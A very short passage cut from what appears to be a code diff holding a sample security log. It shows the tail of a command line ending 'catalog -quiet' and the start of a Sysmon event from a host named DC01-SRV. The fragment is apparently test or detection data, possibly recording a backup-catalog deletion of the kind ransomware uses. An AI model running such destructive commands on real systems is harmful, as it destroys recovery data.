catalog -quiet\nAug 17 02:17:40 DC01-SRV Microsoft-Windows-Sysmo"
+}
